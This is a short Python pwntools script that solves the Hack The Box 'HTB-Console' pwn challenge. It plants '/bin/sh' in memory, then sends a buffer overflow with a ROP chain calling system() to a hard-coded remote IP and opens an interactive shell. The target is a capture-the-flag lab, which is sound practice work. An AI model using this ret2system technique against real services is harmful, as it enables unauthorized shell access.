#!/usr/bin/env python3

#
# This script automates the use of pwntools for a remote service.
# This particular script automates exploitation of HTB-Console pwn challenge on Hack the Box.
#

import time, os, traceback, sys, os
import pwn
import binascii

HOST = "134.209.186.158"
PORT = 32401


# interact with the program to get to where we can exploit
io = pwn.remote(HOST,PORT)
io.recvuntil(b">>")

# get /bin/sh into program memory
buffer = b"hof"
print(buffer.decode())
io.sendline(buffer)
message = io.recvuntil(b"Enter your name:")
print(message.decode())

# fill any whitespace after /bin/sh with \x00 to align to 16 bytes
buffer  = b'/bin/sh'.ljust(16, b'\x00')
print(buffer.decode())
io.sendline(buffer)
message = io.recvuntil(b">>")
print(message.decode())

# now move to maniuplate the flag feature of the program
buffer = b"flag"
print(buffer.decode())
io.sendline(buffer)
message = io.recvuntil(b"Enter flag:")
print(message.decode())

# define the payload
overFlow = 24*b"A"
popRDI = 0x00401473
bssLocation = 0x004040b0
sysLocation = 0x00401040

buffer = overFlow + pwn.p64(popRDI) + pwn.p64(bssLocation) + pwn.p64(sysLocation)
print(buffer)

io.sendline(buffer)

# now we should have a shell
io.interactive()

